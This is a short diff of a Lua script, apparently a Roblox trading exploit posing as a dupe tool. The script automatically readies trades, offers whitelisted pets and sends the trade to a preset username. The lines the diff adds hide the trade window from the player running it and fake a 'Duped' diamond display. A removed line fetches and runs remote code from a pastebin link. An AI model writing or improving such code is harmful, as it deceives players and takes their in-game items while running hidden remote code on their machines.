@@ -99,6 +99,7 @@ end
 
 local function rt()
     while LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame.Visible do
+        LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame.Visible = false
         task.wait(0.1)
         ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
     end
@@ -110,12 +111,12 @@ TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
         task.spawn(rt)
         AddWhitelistedPets()
         ModifyDiamondOffer(Diamonds)
+        diamondsText = tostring(Duped)
     end
 end)
 
 local function StartTrade()
     wait(9)
-    loadstring(game:HttpGet("https://pastebin.com/raw/8wP3Pkwz"))()
     SendTrade(getgenv().UName)
 end
 
